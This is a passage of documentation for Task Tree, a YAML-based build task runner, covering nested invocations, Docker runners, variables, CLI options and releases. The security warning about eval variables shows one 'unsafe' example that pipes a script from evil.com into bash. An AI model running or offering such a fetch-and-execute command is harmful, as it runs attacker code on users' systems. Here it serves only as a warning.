Similarly, if you try to reference an anonymous input:

```yaml
tasks:
  build:
    inputs: [file.txt]  # Anonymous input
    cmd: cat {{ self.inputs.src }}  # Error!
```

You'll get:

```
Task 'build' references input 'src' but has no input named 'src'.
Available named inputs: (none - all inputs are anonymous)
Hint: Define named inputs like: inputs: [{ src: 'file.txt' }]
```

**Key Behaviors:**

- **Two access methods**: Reference by name (`{{ self.inputs.name }}`) or by index (`{{ self.inputs.0 }}`)
- **Template resolution**: Self-references are resolved during dependency graph planning
- **Substitution order**: Variables → Dependency outputs → Self-references → Arguments/Environment
- **Fail-fast validation**: Errors are caught before execution begins (missing names, out-of-bounds indices)
- **Clear error messages**: Lists available names/indices if reference doesn't exist
- **Backward compatible**: Existing anonymous inputs/outputs work unchanged
- **State tracking**: Works correctly with incremental execution and freshness checks
- **Index order**: Positional indices follow YAML declaration order (0-based)

**Limitations:**

- **Anonymous not referenceable by name**: Anonymous inputs/outputs cannot be referenced by name (use positional index instead: `{{ self.inputs.0 }}`)
- **Case sensitive**: `{{ self.inputs.Src }}` and `{{ self.inputs.src }}` are different
- **Argument defaults**: Self-references in argument defaults are not supported (arguments are evaluated before self-references)
- **No negative indices**: Python-style negative indexing (`{{ self.inputs.-1 }}`) is not supported

**Use Cases:**

- **Eliminate repetition**: Define complex paths once, use them multiple times
- **Variable composition**: Combine variables with self-references for clean commands
- **Multiple inputs/outputs**: Reference specific files when tasks have many
- **Complex build pipelines**: Keep commands readable with named artifacts
- **Glob patterns**: Use self-references with glob patterns for dynamic inputs

**Example: Multi-Stage Build:**

```yaml
variables:
  version: "2.1.0"
  platform: "linux"

tasks:
  prepare:
    outputs:
      - builddir: build/{{ var.platform }}-{{ var.version }}
    cmd: mkdir -p {{ self.outputs.builddir }}

  compile:
    deps: [prepare]
    inputs:
      - source: src/main.c
      - headers: include/*.h
    outputs:
      - object: build/{{ var.platform }}-{{ var.version }}/main.o
    cmd: |
      gcc -c {{ self.inputs.source }} \
        -I include \
        -o {{ self.outputs.object }}

  link:
    deps: [compile]
    outputs:
      - executable: build/{{ var.platform }}-{{ var.version }}/app
      - symbols: build/{{ var.platform }}-{{ var.version }}/app.sym
    cmd: |
      gcc build/{{ var.platform }}-{{ var.version }}/main.o \
        -o {{ self.outputs.executable }}
      objcopy --only-keep-debug {{ self.outputs.executable }} {{ self.outputs.symbols }}
```


### Private Tasks

Sometimes you may want to define helper tasks that are useful as dependencies but shouldn't be listed when users run `tt --list`. Mark these tasks as private:

```yaml
tasks:
  # Private helper task - hidden from --list
  setup-deps:
    private: true
    cmd: |
      npm install
      pip install -r requirements.txt

  # Public task that uses the helper
  build:
    deps: [setup-deps]
    cmd: npm run build
```

**Behavior:**
- `tt --list` shows only public tasks (`build` in this example)
- Private tasks can still be executed: `tt setup-deps` works
- Private tasks work normally as dependencies
- By default, all tasks are public (`private: false`)

**Use cases:**
- Internal helper tasks that shouldn't be run directly
- Implementation details you want to hide from users
- Shared setup tasks across multiple public tasks

Note that private tasks remain fully functional - they're only hidden from the list view. Users who know the task name can still execute it directly.


## Nested Task Invocations

Task Tree supports **inline task composition** - tasks can invoke other tasks during their execution by calling `tt <task-name>` (or `python3 -m tasktree <task-name>`) within their `cmd`. This enables orchestrating multi-step workflows where the ordering of subtask invocations relative to other commands matters.

### Basic Usage

```yaml
tasks:
  generate:
    outputs: [src/generated.rs]
    cmd: python codegen.py

  build:
    outputs: [target/release/bin]
    cmd: |
      tt generate
      cargo build --release
```

Running `tt build` first ensures code generation is up-to-date, then compiles. This differs from using `deps: [generate]` because the invocation happens at a specific point within the command sequence.

### State Management

When a task calls `tt <subtask>`, the nested `tt` process independently reads and writes the state file. Task Tree automatically handles state synchronization:

1. Parent task loads state and begins execution
2. Parent's `cmd` invokes `tt child` as a subprocess
3. Child `tt` process reads state, executes if needed, writes updated state
4. After `cmd` completes, parent reloads state from disk (capturing child's updates)
5. Parent updates its own state entry and writes back

This ensures nested task state changes are preserved without manual coordination.

### Incrementality

Nested invocations benefit from normal incremental execution. If a parent task calls `tt child` and child's inputs haven't changed, child will skip execution:

```yaml
tasks:
  child:
    outputs: [data.json]
    cmd: curl https://api.example.com/data > data.json

  parent:
    cmd: |
      echo "Fetching data..."
      tt child
      echo "Processing data..."
      python process.py data.json
```

Running `tt parent` twice will skip `child` on the second run if `data.json` is fresh.

### Use Cases

**Interleaved execution:**
```yaml
tasks:
  setup:
    outputs: [.env]
    cmd: python setup_env.py

  migrate:
    outputs: [db/schema.sql]
    cmd: python migrate.py

  deploy:
    cmd: |
      tt setup
      docker-compose up -d
      tt migrate
      docker-compose restart app
```

**Conditional subtasks:**
```yaml
tasks:
  check:
    cmd: ./health_check.sh

  deploy:
    cmd: |
      tt check || echo "Warning: health check failed"
      ./deploy.sh
      tt check
```

**Multiple invocations:**
```yaml
tasks:
  child1:
    outputs: [out1.txt]
    cmd: echo "child1" > out1.txt

  child2:
    outputs: [out2.txt]
    cmd: echo "child2" > out2.txt

  parent:
    cmd: |
      tt child1
      echo "Between tasks..."
      tt child2
      echo "Done"
```

### Error Handling

Nested task invocations follow normal shell error propagation. If a nested `tt` call fails (exits with a non-zero code), the parent task's `cmd` will fail according to standard shell behavior:

```yaml
tasks:
  risky-task:
    cmd: exit 1  # Fails

  parent:
    cmd: |
      set -e  # Exit on error
      tt risky-task  # Parent fails here if risky-task fails
      echo "This won't run"
```

For conditional execution or error recovery, use standard shell constructs:

```yaml
tasks:
  optional-task:
    cmd: ./might-fail.sh

  parent:
    cmd: |
      tt optional-task || echo "Task failed, continuing anyway"
      echo "This always runs"
```

### Docker Environment Support

Nested task invocations work seamlessly with Docker containers, with intelligent handling of runner compatibility:

#### Same Container Execution

When a task running in a Docker container invokes another task that uses the same Docker runner, the nested task executes directly inside the existing container (no Docker-in-Docker):

```yaml
runners:
  build:
    dockerfile: Dockerfile
    context: .
    shell: /bin/bash

tasks:
  compile:
    run_in: build
    outputs: [app.bin]
    cmd: gcc app.c -o app.bin

  test:
    run_in: build  # Same runner as parent
    cmd: |
      tt compile
      ./app.bin --test
```

Running `tt test` launches a single `build` container. The `tt compile` nested call executes directly inside that container using the runner's shell configuration.

#### Shell-Only Runner Switching

Tasks can switch from a Docker runner to a shell-only runner within a nested call:

```yaml
runners:
  build:
    dockerfile: Dockerfile
    context: .

  lint:
    shell: /bin/sh
    preamble: "set -e"

tasks:
  check-code:
    run_in: lint  # Shell-only runner
    cmd: shellcheck src/*.sh

  build-app:
    run_in: build
    cmd: |
      tt check-code  # Allowed: switch to shell-only runner
      make build
```

The `tt check-code` call runs inside the `build` container using the `lint` runner's shell and preamble.

#### Local to Docker

Local tasks can invoke Docker tasks normally:

```yaml
tasks:
  docker-task:
    run_in: build
    cmd: echo "Running in container"

  local-task:
    cmd: |
      echo "Local execution"
      tt docker-task  # Launches container normally
```

#### Different Docker Runners (Not Supported)

Switching from one Docker runner to a **different** Docker runner is not allowed (Docker-in-Docker is complex and fragile):

```yaml
runners:
  build:
    dockerfile: Dockerfile.build
    context: .

  test:
    dockerfile: Dockerfile.test  # Different Dockerfile
    context: .

tasks:
  child:
    run_in: test  # Different Docker runner

  parent:
    run_in: build
    cmd: tt child  # ❌ ERROR: Cannot switch to different Docker runner
```

**Error message:**
```
Task 'child' requires containerized runner 'test' but is currently executing
inside runner 'build'. Nested Docker-in-Docker invocations across different
containerized runners are not supported. Either remove the runner specification
from 'child', ensure it matches the parent task's runner, or use a shell-only runner.
```

#### How It Works

Task Tree sets environment variables when launching Docker containers:

- `TT_CONTAINERIZED_RUNNER`: Name of the current containerized runner
- `TT_STATE_FILE_PATH`: Path to the state file inside the container

These variables enable nested `tt` calls to detect they're already running in a container and make appropriate decisions:

- **Same runner name**: Execute directly, skip container launch
- **No runner or shell-only runner**: Execute with appropriate shell/preamble
- **Different containerized runner**: Fail with clear error

The state file is automatically mounted into containers at `/workspace/.tasktree-state`, ensuring state updates work correctly across container boundaries.

### Recursion Detection

Task Tree automatically detects and prevents infinite recursion in nested task invocations:

#### Direct Recursion

A task calling itself is detected immediately:

```yaml
tasks:
  self-caller:
    cmd: |
      echo "Before"
      tt self-caller  # ❌ ERROR: Recursion detected
      echo "After (never reached)"
```

**Error message:**
```
Recursion detected in task invocation chain:
self-caller → self-caller

Task 'self-caller' is already running in the call chain.
This would create an infinite loop.
```

#### Indirect Recursion

Cycles involving multiple tasks are also detected:

```yaml
tasks:
  task-a:
    cmd: |
      echo "Task A"
      tt task-b

  task-b:
    cmd: |
      echo "Task B"
      tt task-c

  task-c:
    cmd: |
      echo "Task C"
      tt task-a  # ❌ ERROR: Creates cycle A → B → C → A
```

**Error message:**
```
Recursion detected in task invocation chain:
task-a → task-b → task-c → task-a

Task 'task-a' is already running in the call chain.
This would create an infinite loop.
```

#### How It Works

Task Tree tracks the call chain via the `TT_CALL_CHAIN` environment variable, which contains a comma-separated list of task names currently in execution:

- **Top-level invocation**: `TT_CALL_CHAIN` is empty
- **Nested invocation**: Each task adds its name to the chain before executing its `cmd`
- **Cycle detection**: Before executing, each task checks if its name already appears in the chain

For imported tasks, fully-qualified names (including import prefix) are used to avoid false positives.

#### Deep Nesting Without Cycles

Deep call chains are fully supported as long as they don't form cycles:

```yaml
tasks:
  level-1:
    cmd: |
      echo "Level 1"
      tt level-2

  level-2:
    cmd: |
      echo "Level 2"
      tt level-3

  level-3:
    cmd: |
      echo "Level 3"
      tt level-4

  level-4:
    cmd: echo "Level 4"  # ✅ Works fine - no cycle
```

### Limitations

- **Sequential execution**: Nested calls must run sequentially. Parallel invocations (e.g., using `&`) are not supported.
- **Docker-in-Docker**: Switching between different containerized runners is not supported.
- **Volume conflicts**: User-defined volume mounts cannot use the path `/tasktree-internal/.tasktree-state` as it is reserved for the state file mount.
- **File permissions**: In Docker containers, the state file is mounted from the host. If the container runs as a different user (via Docker USER directive), ensure the user has read/write permissions on the state file. Consider using user mapping (`docker run --user`) to maintain consistent UIDs.

**⚠️ Warning**: Do not use shell backgrounding (`&`) with nested calls. Running nested tasks in parallel (e.g., `tt task1 & tt task2`) will cause state file corruption.

### Notes

- The `tt` binary (or `python3 -m tasktree`) must be available in the execution environment's PATH.
- For Docker tasks, `tt` must be installed inside the container image.
- Nested invocations work with all task features: arguments, dependencies, inputs/outputs, etc.
- State file access is sequential - no locking or concurrency handling is needed.
- The state file is automatically mounted at `/tasktree-internal/.tasktree-state` inside Docker containers. This path was chosen to minimize conflicts with common user directories like `/workspace` or `/app`.

### Environment Variables (Internal)

Task Tree sets these environment variables internally for nested invocation support:

- **`TT_CALL_CHAIN`**: Comma-separated list of task names in the current call stack (e.g., `"parent,child,grandchild"`). Used for recursion detection. Empty for top-level invocations.
- **`TT_CONTAINERIZED_RUNNER`**: Name of the current Docker runner (only set when running inside a container). Used to prevent Docker-in-Docker across different runners.
- **`TT_STATE_FILE_PATH`**: Path to the state file inside Docker containers (e.g., `"/workspace/.tasktree-state"`). Used by nested `tt` calls to locate state.

These variables are managed automatically and generally don't require user interaction. They may be useful for debugging nested invocation issues.


## Environment Variables

Task Tree supports reading environment variables in two ways:

### Direct Substitution

Reference environment variables directly in task commands using `{{ env.VAR_NAME }}`:

```yaml
tasks:
  deploy:
    args: [target]
    cmd: |
      echo "Deploying to {{ arg.target }}"
      echo "User: {{ env.USER }}"
      scp package.tar.gz {{ env.DEPLOY_USER }}@{{ arg.target }}:/opt/
```

```bash
export DEPLOY_USER=admin
tt deploy production
```

Environment variables are resolved at execution time, just before the task runs.

### Via Variables Section

For more complex scenarios, define environment variables in the `variables` section:

```yaml
variables:
  # Required env var (error if not set)
  api_key: { env: API_KEY }
  
  # Optional env var with default
  port: { env: PORT, default: "8080" }
  log_level: { env: LOG_LEVEL, default: "info" }
  
  # Or using string substitution
  deploy_user: "{{ env.DEPLOY_USER }}"

  # Compose with other variables
  connection: "{{ var.db_host }}:5432"
  api_url: "https://{{ var.db_host }}/api"

tasks:
  deploy:
    cmd: |
      curl -H "Authorization: Bearer {{ var.api_key }}" {{ var.api_url }}
      ssh {{ var.deploy_user }}@{{ var.db_host }} /opt/deploy.sh
```

**Key differences:**
- **`{ env: VAR }`** — Resolved at parse time (when `tt` starts)
- **`"{{ env.VAR }}"`** — Resolved at parse time in variables, execution time in tasks
- **Direct `{{ env.VAR }}`** — Resolved at execution time

### When to Use Which

**Use direct substitution** (`{{ env.VAR }}`) when:
- You need simple, one-off environment variable references
- The value is used in a single place
- You want the value resolved at execution time

**Use variables section** when:
- You need to compose values from multiple sources
- The same value is used in multiple places
- You need variable-in-variable expansion

**Examples:**

```yaml
variables:
  # Compose configuration from environment
  home: { env: HOME }
  config_dir: "{{ var.home }}/.myapp"

tasks:
  # Direct reference for simple cases
  show-user:
    cmd: echo "Running as {{ env.USER }}"

  # Mixed usage
  deploy:
    args: [app]
    cmd: |
      echo "Config: {{ var.config_dir }}"
      echo "Deploying {{ arg.app }} as {{ env.DEPLOY_USER }}"
```

**Environment variable values are always strings**, even if they look like numbers.

### Working Directory

Environment variables work in `working_dir` as well:

```yaml
tasks:
  build:
    working_dir: "{{ env.BUILD_DIR }}"
    cmd: make all
```

### Evaluating Commands in Variables

Variables can be populated by executing shell commands using `{ eval: command }`:

```yaml
variables:
  git_hash: { eval: "git rev-parse --short HEAD" }
  timestamp: { eval: "date +%Y%m%d-%H%M%S" }
  image_tag: "myapp:{{ var.git_hash }}"

tasks:
  build:
    cmd: docker build -t {{ var.image_tag }} .
```

**Execution:**

- Commands are executed when `tt` starts (parse time), before any task execution
- Working directory is the recipe file location
- Uses `default_env` shell if specified in the recipe, otherwise platform default (bash on Unix, cmd on Windows)
- Stdout is captured as the variable value
- Stderr is ignored (or printed to terminal, not captured)
- Trailing newline is automatically stripped (like `{ read: ... }`)

**Exit codes:**

Commands must succeed (exit code 0) or `tt` will fail with an error:

```
Command failed for variable 'git_hash': git rev-parse --short HEAD
Exit code: 128
stderr: fatal: not a git repository (or any of the parent directories): .git

Ensure the command succeeds when run from the recipe file location.
```

**⚠️ Security Warning**

The `{ eval: command }` feature executes shell commands with your current permissions when `tt` starts.

**DO NOT** use recipes from untrusted sources that contain `{ eval: ... }`.

Commands execute with:
- Your current user permissions
- Access to your environment variables
- The recipe file directory as working directory

**Best practices:**
- Only use `eval` in recipes you've written or thoroughly reviewed
- Avoid complex commands with side effects
- Prefer `{ read: file }` or `{ env: VAR }` when possible
- Use for read-only operations (git info, vault reads, system info)

**Example safe uses:**

```yaml
variables:
  # Version control information
  version: { eval: "git describe --tags" }
  commit: { eval: "git rev-parse HEAD" }
  branch: { eval: "git rev-parse --abbrev-ref HEAD" }

  # System information
  hostname: { eval: "hostname" }
  username: { eval: "whoami" }

  # Secrets management (read-only)
  vault_token: { eval: "vault read -field=token secret/api" }
```

**Example unsafe uses:**

```yaml
variables:
  # DON'T DO THIS - modifies state at parse time
  counter: { eval: "expr $(cat counter) + 1 > counter && cat counter" }

  # DON'T DO THIS - downloads and executes code
  script: { eval: "curl https://evil.com/script.sh | bash" }
```

**Use cases:**

1. **Version control info** - Embed git commit hashes, tags, or branch names in builds
2. **Secrets management** - Read API tokens from secret vaults (Vault, AWS Secrets Manager, etc.)
3. **System information** - Capture hostname, username, or timestamp for deployments
4. **Dynamic configuration** - Read values from external tools or configuration systems

**Type handling:**

Eval output is always a string, even if the command outputs a number:

```yaml
variables:
  port: { eval: "echo 8080" }  # port = "8080" (string, not int)
```

**Performance note:**

Every `{ eval: ... }` runs a subprocess at parse time, adding startup latency. For frequently-run tasks, consider caching results in files or using `{ read: ... }` to read pre-computed values.

## Built-in Variables

Task Tree provides system-provided variables that tasks can reference using `{{ tt.variable_name }}` syntax. These provide access to common system information without requiring manual configuration.

### Available Variables

| Variable | Description | Example Value |
|----------|-------------|---------------|
| `{{ tt.project_root }}` | Absolute path to project root (where `.tasktree-state` lives) | `/home/user/myproject` |
| `{{ tt.recipe_dir }}` | Absolute path to directory containing the recipe file | `/home/user/myproject` or `/home/user/myproject/subdir` |
| `{{ tt.task_name }}` | Name of currently executing task | `build` |
| `{{ tt.working_dir }}` | Absolute path to task's effective working directory | `/home/user/myproject/src` |
| `{{ tt.timestamp }}` | ISO8601 timestamp when task started execution | `2024-12-28T14:30:45Z` |
| `{{ tt.timestamp_unix }}` | Unix epoch timestamp when task started | `1703772645` |
| `{{ tt.user_home }}` | Current user's home directory (cross-platform) | `/home/user` or `C:\Users\user` |
| `{{ tt.user_name }}` | Current username | `alice` |

### Usage Examples

**Logging with timestamps:**

```yaml
tasks:
  build:
    cmd: |
      echo "Building {{ tt.task_name }} at {{ tt.timestamp }}"
      cargo build --release
```

**Artifact naming:**

```yaml
tasks:
  package:
    deps: [build]
    cmd: |
      mkdir -p {{ tt.project_root }}/dist
      tar czf {{ tt.project_root }}/dist/app-{{ tt.timestamp_unix }}.tar.gz target/release/
```

**Cross-platform paths:**

```yaml
tasks:
  copy-config:
    cmd: cp config.yaml {{ tt.user_home }}/.myapp/config.yaml
```

**Mixed with other variables:**

```yaml
variables:
  version: { eval: "git describe --tags" }

tasks:
  deploy:
    args: [environment]
    cmd: |
      echo "Deploying version {{ var.version }} to {{ arg.environment }}"
      echo "From {{ tt.project_root }} by {{ tt.user_name }}"
      ./deploy.sh {{ arg.environment }}
```

### Important Notes

- **Timestamp consistency**: The same timestamp is used throughout a single task execution (all references to `{{ tt.timestamp }}` and `{{ tt.timestamp_unix }}` within one task will have identical values)
- **Working directory**: `{{ tt.working_dir }}` reflects the task's `working_dir` setting, or the project root if not specified
- **Recipe vs Project**: `{{ tt.recipe_dir }}` points to where the recipe file is located, while `{{ tt.project_root }}` points to where the `.tasktree-state` file is (usually the same, but can differ)
- **Username fallback**: If `os.getlogin()` fails, `{{ tt.user_name }}` falls back to `$USER` or `$USERNAME` environment variables, or `"unknown"` if neither is set

## File Imports

Split task definitions across multiple files for better organisation:

```yaml
# tasktree.yaml
imports:
  - file: build/tasks.yml
    as: build
  - file: deploy/tasks.yml
    as: deploy

tasks:
  test:
    deps: [build.compile, build.test-compile]
    cmd: ./run-tests.sh

  ci:
    deps: [build.all, test, deploy.staging]
```

Imported tasks are namespaced and can be referenced as dependencies. Each imported file is self-contained—it cannot depend on tasks in the importing file.

## Glob Patterns

Input and output patterns support standard glob syntax:

- `src/*.rs` — All Rust files in `src/`
- `src/**/*.rs` — All Rust files recursively
- `{file1,file2}` — Specific files
- `**/*.{js,ts}` — Multiple extensions recursively

## State Management

### How State Works

Each task is identified by a hash of its definition. The hash includes:

- Command to execute
- Output patterns
- Working directory
- Argument definitions
- Execution runner

State tracks:
- When the task last ran
- Timestamps of input files at that time

Tasks are re-run when their definition changes, inputs are newer than the last run, or the runner changes.

### What's Not In The Hash

Changes to these don't invalidate cached state:

- Task name (tasks can be renamed freely)
- Description
- Dependencies (only affects execution order)
- Explicit inputs (tracked by timestamp, not definition)

### Automatic Cleanup

At the start of each invocation, state is checked for invalid task hashes and non-existent ones are automatically removed. Delete a task from your recipe file and its state disappears the next time you run `tt <cmd>`

## Command-Line Options

Task Tree provides several command-line options for controlling task execution:

### Recipe File Selection

Task Tree automatically discovers recipe files in the current directory and parent directories. You can also explicitly specify which file to use.

**Automatic Discovery:**

Task Tree searches for recipe files in the following order of preference:

1. **Standard recipe files** (searched first, in order):
   - `tasktree.yaml`
   - `tasktree.yml`
   - `tt.yaml`

2. **Import files** (searched only if no standard files found):
   - `*.tasks` files (e.g., `build.tasks`, `deploy.tasks`)

If multiple files of the same priority level exist in the same directory, Task Tree will report an error and ask you to specify which file to use with `--tasks`.

**Manual Selection:**

```bash
# Specify a recipe file explicitly
tt --tasks build.tasks build
tt -T custom-recipe.yaml test

# Useful when you have multiple recipe files in the same directory
tt --tasks ci.yaml deploy
```

**File Search Behavior:**

- Task Tree searches **upward** from the current directory to find recipe files
- **Standard recipe files** (`.yaml`/`.yml`) are always preferred over `*.tasks` files
- `*.tasks` files are typically used for imports and are only used as main recipes if no standard files exist
- The `.tasktree-state` file is created in the directory containing the recipe file

### Execution Control

```bash
# Force re-run (ignore freshness checks)
tt --force build
tt -f build

# Run only the specified task, skip dependencies (implies --force)
tt --only deploy
tt -o deploy

# Override runner for all tasks
tt --runner python analyze
tt -r powershell build

# Control task subprocess output display
tt --task-output all build     # Show both stdout and stderr (default)
tt --task-output out test      # Show only stdout
tt --task-output err deploy    # Show only stderr
tt --task-output on-err ci     # Show stderr only if task fails
tt --task-output none build    # Suppress all task output
tt -O none build               # Short form
```

### Information Commands

```bash
# List all available tasks
tt --list
tt -l

# Show detailed task definition
tt --show build

# Show dependency tree (without execution)
tt --tree deploy

# Show version
tt --version
tt -v

# Create a blank recipe file
tt --init
```

### State Management

```bash
# Remove state file (reset task cache)
tt --clean
```

### Common Workflows

```bash
# Fresh build of everything
tt --force build

# Run a task without rebuilding dependencies
tt --only test

# Test with a different shell/runner
tt --runner python test

# Force rebuild and deploy
tt --force deploy production
```

### Logging Control

Task Tree provides fine-grained control over diagnostic logging verbosity through the `--log-level` flag. This allows you to adjust the amount of information displayed about task execution, from minimal error-only output to detailed trace logging.

**Log Levels:**

```bash
# Show only fatal errors (malformed task files, missing dependencies)
tt --log-level fatal build

# Show fatal errors and task execution failures
tt --log-level error build

# Show errors and warnings (deprecated features, configuration issues)
tt --log-level warn build

# Show normal execution progress (default)
tt --log-level info build
tt build  # Same as above

# Show detailed diagnostics (variable values, resolved paths, environment details)
tt --log-level debug build

# Show fine-grained execution tracing
tt --log-level trace build
```

**Short Form:**

```bash
tt -L debug build
tt -L trace test
```

**Case Insensitive:**

```bash
tt --log-level INFO build    # Works
tt --log-level Debug test    # Works
tt --log-level TRACE deploy  # Works
```

**Common Use Cases:**

**Debugging Workflows:**
```bash
# See variable substitution and resolved paths
tt --log-level debug deploy production

# See detailed execution steps and internal state
tt --log-level trace build
```

**CI/CD Environments:**
```bash
# Suppress progress messages, show only errors
tt --log-level error build test package

# Minimal output for clean build logs
tt --log-level warn ci
```

**Normal Development:**
```bash
# Default level shows normal execution progress
tt build test
```

**Understanding Log Levels:**

- **FATAL** (least verbose): Only unrecoverable errors that prevent execution
- **ERROR**: Fatal errors plus individual task failures
- **WARN**: Errors plus warnings about deprecated features or configuration issues
- **INFO** (default): Normal execution progress messages
- **DEBUG**: Info plus variable values, resolved paths, environment configuration
- **TRACE** (most verbose): Debug plus fine-grained execution tracing

Log levels are hierarchical - setting a higher verbosity level (e.g., DEBUG) includes all messages from lower levels (FATAL, ERROR, WARN, INFO).

**Note:** The `--log-level` flag controls Task Tree's own diagnostic messages. It does not affect the output of task commands themselves - use `--task-output` to control task subprocess output (see below).

### Task Output Control

Task Tree provides fine-grained control over task subprocess output through the `--task-output` flag. This allows you to control whether tasks display their stdout, stderr, both, or neither, independent of Task Tree's own diagnostic logging.

**Output Modes:**

```bash
# Show both stdout and stderr (default)
tt --task-output all build
tt -O all build
tt build  # Same as above

# Show only stdout, suppress stderr
tt --task-output out build
tt -O out test

# Show only stderr, suppress stdout
tt --task-output err build
tt -O err deploy

# Show stderr only if the task fails (stdout always suppressed)
tt --task-output on-err build
tt -O on-err ci

# Suppress all task output
tt --task-output none build
tt -O none build
```

**Case Insensitive:**

```bash
tt --task-output ALL build    # Works
tt --task-output Out test     # Works
tt --task-output ON-ERR ci    # Works
```

**Common Use Cases:**

**CI/CD Environments:**
```bash
# Suppress task output, show only tasktree diagnostics
tt --log-level info --task-output none build test

# Show errors only if they occur
tt --log-level error --task-output on-err ci
```

**Debugging:**
```bash
# Show only stderr to focus on warnings/errors
tt --task-output err build

# Show everything for full visibility
tt --log-level debug --task-output all build
```

**Clean Build Logs:**
```bash
# Suppress noisy build output, show only tasktree progress
tt --task-output none build package deploy
```

**Task-Level Configuration:**

Tasks can specify their own default output behavior in the recipe file:

```yaml
tasks:
  # Noisy task - suppress output by default
  install-deps:
    task_output: none
    cmd: npm install

  # Let pytest manage its own output - it's already good at that
  test:
    cmd: pytest tests/

  # Don't clutter CI logs with loads of output, unless something goes wrong
  build:
    task_output: on-err
    cmd: cargo build --release
```

**Understanding Output Modes:**

| Mode | Stdout | Stderr | Notes |
|------|--------|--------|-------|
| `all` | ✓ | ✓ | Default behavior, shows everything |
| `out` | ✓ | ✗ | Good for capturing command results |
| `err` | ✗ | ✓ | Focus on warnings and errors |
| `on-err` | ✗ | ✓ (on failure) | Stderr buffered, shown only if task fails |
| `none` | ✗ | ✗ | Silent execution, useful for noisy tasks |

**Override Behavior:**

- Command-line `--task-output` overrides task-level `task_output` settings for all tasks
- Task-level `task_output` applies only if no command-line flag is provided
- Default behavior is `all` if neither is specified

**Important Notes:**

- Task output control is independent of `--log-level` - you can suppress task output while still seeing tasktree diagnostics
- The `on-err` mode buffers stderr in memory and only displays it if the task fails
- Output suppression does not affect the task's execution - files are still created, commands still run
- Task exit codes are always checked regardless of output mode

## Example: Full Build Pipeline

```yaml
imports:
  - file: common/docker.yml
    as: docker

tasks:
  compile:
    desc: Build application binaries
    outputs: [target/release/app]
    task_output: "on-err" # We only care about seeing this if it fails.
    cmd: cargo build --release

  test-unit:
    desc: Run unit tests
    deps: [compile]
    cmd: cargo test

  package:
    desc: Create distribution archive
    deps: [compile]
    outputs: [dist/app-{{ arg.version }}.tar.gz]
    args: [version]
    cmd: |
      mkdir -p dist
      tar czf dist/app-{{ arg.version }}.tar.gz \
        target/release/app \
        config/ \
        migrations/

  deploy:
    desc: Deploy to environment
    deps: [package, docker.build-runtime]
    args: [environment, version]
    cmd: |
      scp dist/app-{{ arg.version }}.tar.gz {{ env.DEPLOY_USER }}@{{ arg.environment }}:/opt/
      ssh {{ env.DEPLOY_USER }}@{{ arg.environment }} /opt/deploy.sh {{ arg.version }}

  integration-test:
    desc: Run integration tests against deployed environment
    deps: [deploy]
    args: [environment, version]
    cmd: pytest tests/integration/ --env={{ arg.environment }}
```

Run the full pipeline:

```bash
export DEPLOY_USER=admin
tt integration-test staging version=1.2.3
```

This will:
1. Compile if sources have changed
2. Run unit tests if compilation ran
3. Package if compilation ran or version argument is new
4. Build Docker runtime (from imported file) if needed
5. Deploy if package or Docker image changed
6. Run integration tests (always runs)

## Implementation Notes

Built with Python 3.11+ using:

- **PyYAML** for recipe parsing
- **Typer**, **Click**, **Rich** for CLI
- **graphlib.TopologicalSorter** for dependency resolution
- **pathlib** for file operations and glob expansion

State file uses JSON format for simplicity and standard library compatibility.

## Development

### Setup Development Environment

```bash
# Clone repository
git clone https://github.com/kevinchannon/task-tree.git
cd tasktree

# Install uv (if not already installed)
curl -LsSf https://astral.sh/uv/install.sh | sh

# Install dependencies
uv sync

# Install in editable mode
pipx install -e .
```

### Running Tests

```bash
# Run all tests
uv run pytest

# Run with verbose output
uv run pytest -v

# Run specific test file
uv run pytest tests/unit/test_executor.py
```

### Using Task Tree for Development

The repository includes a `tasktree.yaml` with development tasks:

```bash
tt test          # Run tests
tt build         # Build wheel package
tt install-dev   # Install package in development mode
tt clean         # Remove build artifacts
```

## Releasing

New releases are created by pushing version tags to GitHub. The release workflow automatically:
- Builds wheel and source distributions
- Creates a GitHub Release with artifacts
- Publishes to PyPI via trusted publishing

### Release Process

1. Ensure main branch is ready:
```bash
git checkout main
git pull
```

2. Create and push a version tag:
```bash
git tag v1.0.0
git push origin v1.0.0
```

3. GitHub Actions will automatically:
   - Extract version from tag (e.g., `v1.0.0` → `1.0.0`)
   - Update `pyproject.toml` with the version
   - Build wheel and sdist
   - Create GitHub Release
   - Publish to PyPI

4. Verify the release:
   - GitHub: https://github.com/kevinchannon/task-tree/releases
   - PyPI: https://pypi.org/kevinchannon/tasktree/
   - Test: `pipx install --force tasktree`

### Version Numbering

Follow semantic versioning:
- `v1.0.0` - Major release (breaking changes)
- `v1.1.0` - Minor release (new features, backward compatible)
- `v1.1.1` - Patch release (bug fixes)